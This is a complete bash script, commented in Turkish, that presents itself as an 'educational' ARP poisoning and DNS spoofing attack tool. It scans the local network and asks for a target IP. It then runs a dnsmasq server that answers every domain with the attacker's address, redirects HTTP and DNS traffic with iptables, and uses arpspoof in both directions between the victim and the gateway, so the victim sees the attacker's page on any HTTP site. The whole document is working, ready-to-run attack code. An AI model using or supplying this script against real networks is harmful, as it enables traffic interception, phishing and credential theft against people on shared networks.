#!/bin/bash

# Gelişmiş ARP Poisoning + DNS Spoofing Saldırısı
# Eğitim Amaçlıdır

# --- Renkler ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# --- Kontroller ---
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}HATA: Bu betik root yetkileriyle çalıştırılmalıdır. (sudo ./attack.sh)${NC}"
    exit 1
fi

for tool in arpspoof arp-scan python dnsmasq; do
    if ! command -v $tool &> /dev/null; then
        echo -e "${RED}HATA: '$tool' komutu bulunamadı. Lütfen 'dsniff', 'arp-scan', 'python' ve 'dnsmasq' paketlerini kurun.${NC}"
        exit 1
    fi
done

# --- Temizlik Fonksiyonu ---
cleanup() {
    echo -e "\n${YELLOW}[!] Temizlik yapılıyor...${NC}"
    
    # IP forwarding'i kapat
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo -e "[+] IP forwarding kapatıldı."

    # iptables kurallarını sil
    iptables -t nat -F
    echo -e "[+] iptables NAT kuralları temizlendi."

    # Arka plandaki işlemleri sonlandır
    pkill -f arpspoof
    pkill -f "python -m http.server 8080"
    pkill -f dnsmasq
    echo -e "[+] Arka plan işlemleri durduruldu."
    
    # systemd-resolved servisini (eğer durdurulduysa) yeniden başlat
    if [ -f /tmp/resolved_stopped.flag ]; then
        echo -e "[+] systemd-resolved servisi yeniden başlatılıyor..."
        systemctl start systemd-resolved
        rm /tmp/resolved_stopped.flag
    fi

    echo -e "${GREEN}[✓] Temizlik tamamlandı.${NC}"
    exit 0
}

# CTRL+C'ye basıldığında temizlik fonksiyonunu çağır
trap cleanup SIGINT

# --- Başlangıç ---
clear
echo -e "${GREEN}=============================================="${NC}
echo -e "${GREEN}  ARP POISONING + DNS SPOOFING SALDIRI ARACI  "${NC}
echo -e "${GREEN}=============================================="${NC}

# --- Ağ Bilgileri ---
INTERFACE=$(ip route | grep default | awk '{print $5}')
GATEWAY=$(ip route | grep default | awk '{print $3}')
MY_IP=$(ip -4 addr show $INTERFACE | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$INTERFACE" ] || [ -z "$GATEWAY" ] || [ -z "$MY_IP" ]; then
    echo -e "${RED}HATA: Ağ bilgileri alınamadı.${NC}"
    exit 1
fi

echo -e "[+] Ağ Arayüzü: ${YELLOW}$INTERFACE${NC}"
echo -e "[+] Gateway: ${YELLOW}$GATEWAY${NC}"
echo -e "[+] Saldırgan IP: ${YELLOW}$MY_IP${NC}"

# --- Hedef Tarama ---
echo -e "\n${GREEN}[*] Ağdaki hedefler taranıyor...${NC}"
arp-scan --localnet -I $INTERFACE | grep -E '^[0-9]' | awk '{print $1"\t"$2}'

# --- Hedef Seçimi ---
read -p "Lütfen hedef IP adresini girin: " TARGET_IP

if [ -z "$TARGET_IP" ]; then
    echo -e "${RED}HATA: Hedef IP adresi girmediniz.${NC}"
    exit 1
fi

echo -e "[+] Hedef: ${YELLOW}$TARGET_IP${NC}"

# --- Saldırı Başlatma ---

# 1. Port 53 Kontrolü ve DNS Sunucu Kurulumu
echo -e "\n${GREEN}[1/5] DNS Spoofing ayarlanıyor...${NC}"
# systemd-resolved port 53'ü kullanıyorsa durdur
if lsof -i:53 | grep -q systemd-resolve; then
    echo -e "${YELLOW}[!] systemd-resolved 53. portu kullanıyor. Geçici olarak durduruluyor...${NC}"
    systemctl stop systemd-resolved
    touch /tmp/resolved_stopped.flag # Temizlikte yeniden başlatmak için işaretle
fi

# Tüm adresleri kendi IP'mize yönlendiren dnsmasq yapılandırması oluştur
DNSMASQ_CONF=$(mktemp)
cat > $DNSMASQ_CONF << EOF
port=53
listen-address=$MY_IP
address=/#/$MY_IP
log-queries
EOF

# dnsmasq'ı başlat
dnsmasq -C $DNSMASQ_CONF --no-daemon &

# 2. IP Forwarding'i etkinleştir
echo -e "${GREEN}[2/5] IP forwarding etkinleştiriliyor...${NC}"
echo 1 > /proc/sys/net/ipv4/ip_forward

# 3. Web sunucusunu başlat
echo -e "${GREEN}[3/5] Port 8080 üzerinde web sunucusu başlatılıyor...${NC}"
if [ ! -f "index.html" ]; then
    echo -e "${RED}HATA: index.html dosyası bulunamadı!${NC}"
    cleanup
fi
python -m http.server 8080 &> /dev/null &

# 4. iptables ile port yönlendirmeleri yapılıyor...
echo -e "${GREEN}[4/5] iptables ile port yönlendirmeleri yapılıyor...${NC}"
# HTTP (80) trafiğini yerel web sunucumuza (8080) yönlendir
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
# DNS (53) trafiğini yerel DNS sunucumuza (dnsmasq) yönlendir
iptables -t nat -A PREROUTING -p udp --destination-port 53 -j DNAT --to-destination $MY_IP
iptables -t nat -A PREROUTING -p tcp --destination-port 53 -j DNAT --to-destination $MY_IP

# 5. ARP Spoofing'i başlat
echo -e "${GREEN}[5/5] ARP zehirlenmesi başlatılıyor...${NC}"

# Hedefe, gateway'in biz olduğumuzu söylüyoruz
arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY &

# Gateway'e, hedefin biz olduğumuzu söylüyoruz
arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP &

# --- Sonuç ---
echo -e "\n${GREEN}=================================="${NC}
echo -e "${GREEN}   SALDIRI BAŞLATILDI!            "${NC}
echo -e "${GREEN}=================================="${NC}
echo -e "Hedef (${YELLOW}$TARGET_IP${NC}) herhangi bir HTTP siteye girdiğinde sizin sayfanız yüklenecektir."
echo -e "(Var olmayan siteler dahil: http://asdasd.com)"
echo -e "Saldırıyı durdurmak için ${RED}CTRL+C${NC} tuşlarına basın."

# Betiğin kapanmaması için bekle
wait